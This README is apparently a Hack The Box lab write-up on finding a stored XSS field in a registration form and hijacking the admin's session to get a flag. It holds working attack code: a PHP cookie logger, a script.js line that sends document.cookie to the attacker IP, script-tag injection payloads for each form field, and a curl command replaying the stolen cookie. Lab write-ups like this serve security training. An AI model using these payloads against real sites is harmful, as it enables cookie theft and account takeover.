# HTB XSS and Session Hijacking Writeup

This repository documents identifying a vulnerable input field via XSS and performing session hijacking to steal the admin's cookie and retrieve the flag from `login.php`.

- **Attacker IP:** `10.10.14.179`
- **Target IP:** `10.129.31.89`
- **Date:** April 11, 2025

# Objective
The goal was to identify a vulnerable input field in a web form hosted at ` http://10.129.31.89/hijacking/index.php `, exploit it using Cross-Site Scripting (XSS), and perform session hijacking to steal the admin’s session cookie. The captured cookie would then be used to authenticate to ` http://10.129.31.89/hijacking/login.php ` and retrieve a flag, likely part of a Hack The Box (HTB) lab challenge.

## Step-by-Step-Solution

### Step 1: Set Up Attacker Server
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
```
**index.php** 
```bash
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
**script.js**
```bash
new Image().src='http://10.10.14.179/index.php?c='+document.cookie;
```
![Screenshot 2025-04-11 121049](https://github.com/user-attachments/assets/d73e3601-5734-474c-a982-8b3e09d9a51f)

**cookies.txt**
```bash
sudo touch cookies.txt
sudo chmod 666 cookies.txt
```
**Run server**
```bash
sudo php -S 0.0.0.0:80
```
### Step 2: Identify Vulnerable Field
**Form**: ` http://10.129.31.89/hijacking/index.php`

**Fields Tested:**

fullname: ` "><script src=http://10.10.14.179/fullname></script> `

username: ` "><script src=http://10.10.14.179/username></script> `

password: ` "><script src=http://10.10.14.179/password></script> `

email: ` "><script src=http://10.10.14.179/email></script> `

imgurl: ` "><script src=http://10.10.14.179/imgurl></script> `

**Process:**

Injected each payload into one field at a time, others set to **test**.

Checked server logs for requests (e.g., GET /fullname).

Vulnerable field identified when a request appeared.

![image](https://github.com/user-attachments/assets/549aa3b7-f9d2-4f40-bda3-55dc883c05c1)


### Step 3: Exploit with XSS
**Payload**: 

```bash ">
<script src=http://10.10.14.179/script.js></script>
```

Inject this script into the vulnerable field


**Cookie Captured**:
```bash
cat cookies.txt
```

### Step 4: Use Cookie in login.php
URL: ` http://10.129.31.89/hijacking/login.php `

Added cookie via DevTools > Storage > Cookies.

Refreshed to get the flag.

![Screenshot 2025-04-11 124820](https://github.com/user-attachments/assets/4727fca4-bd11-4b35-ae36-4e8c98bfa418)

# Tools Used

**PHP Development Server:**
` sudo php -S 0.0.0.0:80 `

Purpose: Hosted ` index.php ` and ` script.js ` on ` 10.10.14.179 ` to log cookies and serve the XSS payload.

**cURL:**
` curl -b "cookie=<value>" http://10.129.31.89/hijacking/login.php `

Purpose: Tested the stolen cookie against ` login.php ` to retrieve the flag.

**Web Browser with Developer Tools**:

Browser: Any modern browser (e.g., Chrome, Firefox).

Used to inspect the form, enable the submit button ` (document.getElementById('register').disabled = false;) ` , and manually set cookies in the Storage tab.

**Text Editor**:

nano (e.g., ` nano index.php, nano script.js ` ).

Purpose: Created and edited server-side scripts (`index.php`) and client-side payload (`script.js`).

**Terminal:**
Managed server setup, file permissions (`sudo chmod 666 cookies.txt`), and log monitoring (`cat cookies.txt`).

**Git:**
`git init, git add, git commit, git push`.

Purpose: Documented the process in a GitHub repository.


